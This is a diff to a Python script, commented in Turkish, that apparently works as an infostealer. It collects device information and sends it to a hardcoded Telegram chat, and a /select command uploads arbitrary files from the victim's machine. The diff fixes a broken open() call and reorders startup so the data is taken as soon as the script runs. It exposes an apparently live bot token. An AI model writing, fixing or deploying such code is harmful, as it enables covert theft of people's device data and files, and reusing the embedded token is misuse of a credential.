@@ -3,11 +3,11 @@ import json
 import time
 import requests
 import telegram
-from telegram.ext import Updater, CommandHandler, Filters, MessageHandler
+from telegram.ext import Updater, CommandHandler
 
 # Telegram Bot Ayarları
 BOT_TOKEN = "7990420796:AAEqVI1L0WiGL8l66L_njVYvgnaC2vNbL6Y"
-CHAT_ID = "-4804654305"
+CHAT_ID = "4804654305"
 TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
 
 # Dosya-nesne eşleştirmesi için global değişken
@@ -60,10 +60,7 @@ def bilgileri_kaydet_ve_gonder():
         json.dump(cihaz_bilgisi, f, indent=4, ensure_ascii=False)
     print(f"Cihaz bilgisi {cihaz_dosyasi} kaydedildi!")
 
-    with open(cihaz_dosyasi, "rb _
-
-```python
-") as f:
+    with open(cihaz_dosyasi, "rb") as f:
         requests.post(TELEGRAM_API, data={"chat_id": CHAT_ID}, files={"document": f})
     print(f"{cihaz_dosyasi} Telegram'a gönderildi!")
 
@@ -89,9 +86,9 @@ def select_file(update, context):
         with open(dosya_yolu, "rb") as f:
             update.message.reply_document(document=f, filename=os.path.basename(dosya_yolu))
         print(f"{numara} numaralı dosya ({dosya_yolu}) Telegram'a gönderildi!")
-    except Exception as e:
-        update.message.reply_text(f"Hata, lanet: {str(e)}")
-        print(f"Select hatası: {str(e)}")
+    except:
+        update.message.reply_text("Hata, dosya gönderilemedi!")
+        print(f"Select hatası: {numara}")
 
 def main():
     print("Botu başlatıyorum, kral! 😈")
@@ -99,13 +96,11 @@ def main():
     dp = updater.dispatcher
     dp.add_handler(CommandHandler("select", select_file, pass_args=True))
     
-    # Botu başlat
-    updater.start_polling()
-    
     # Bilgileri topla ve gönder
     bilgileri_kaydet_ve_gonder()
     
-    # Botun çalışmasını sürdür
+    # Botu başlat
+    updater.start_polling()
     updater.idle()
 
 if __name__ == "__main__":
